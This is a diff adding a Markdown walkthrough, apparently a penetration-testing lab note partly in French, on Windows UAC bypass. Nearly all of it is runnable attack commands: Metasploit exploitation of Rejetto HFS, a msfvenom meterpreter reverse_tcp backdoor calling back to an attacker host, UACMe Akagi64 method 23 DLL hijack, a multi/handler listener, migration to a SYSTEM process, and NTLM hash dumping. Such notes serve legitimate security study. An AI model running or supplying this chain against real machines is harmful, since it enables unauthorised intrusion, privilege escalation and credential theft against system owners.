@@ -1,0 +1,99 @@
+# UAC Exploitation (Priv Escalation)
+
+---
+
+## **First access with low privilege
+
+Exploiting HFS rejetto vulnerable version > 2.3
+
+> - msfconsole -q
+> - use exploit/windows/http/rejetto_hfs_exec
+> - set RHOSTS 10.0.27.103
+> - exploit
+
+**Checking the current user Informations**
+
+> - getuid
+> - sysinfo
+
+---
+
+## Check if the compromised account is a member of the local administrator group
+
+**Commands:**
+
+> - shell
+> - net localgroup administrators
+
+---
+
+## UACMe
+
+We are going to bypass the UAC for admin user with the help of UACMe tool.
+UACMe:
+
+> - Defeat Windows User Account Control (UAC) and get Administrator privileges.
+> - It abuses the built-in Windows AutoElevate executables.
+> - It has 65+ methods that can be used by the user to bypass UAC depending on the Windows OS version
+
+---
+
+## Scenario (Explained)
+
+> - On genere un payload avec msfvenom de type windows
+> - On envoie les fichiers Akagai64 (UACMe) et le payload créé avec la premier access (via HFS rejetto)
+> - Ensuite on créé un listener pour le payload avec le module multi/handler
+> - Enfin on execute akagai64 avec comme parametre : la methode, et le payload
+
+---
+
+## Scenario
+
+#### Create the payload
+
+> - msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.1.3 LPORT=4444 -f exe > 'backdoor.exe'
+
+#### Upload the payload & the Akagi64 files
+
+> - cd C:\\Users\\admin\\AppData\\Local\\Temp
+> - upload /root/Desktop/tools/UACME/Akagi64.exe .
+> - upload /root/backdoor.exe .
+> - ls
+
+#### Create the listener (With another session of msfconsole)
+
+> - msfconsole -q
+> - use exploit/multi/handler
+> - set PAYLOAD windows/meterpreter/reverse_tcp
+> - set LHOST 10.10.1.3
+> - set LPORT 4444
+> - exploit
+
+#### Create the listener (With another session of msfconsole)
+
+> - shell 
+> - Akagi64.exe 23 C:\Users\admin\AppData\Local\Temp\backdoor.exe
+
+**Note** : Please provide the full path of the backdoor executable.
+
+We are going to use UACMe method number 23:
+
+> - **Author** : Leo Davidson derivative
+> - **Type** : Dll Hijack
+> - **Method** : IFileOperation
+> - **Target(s)** : \system32\pkgmgr.exe
+> - **Component(s)** : DismCore.dll
+> - **Implementation** : ucmDismMethod
+
+#### After this exploitation
+
+Migrate to a process using NT Authority \System
+
+**Commands**: 
+
+> - ps -S tools.exe
+> - migrate 680
+
+Dump user NTLM hash :
+
+> - hashdump
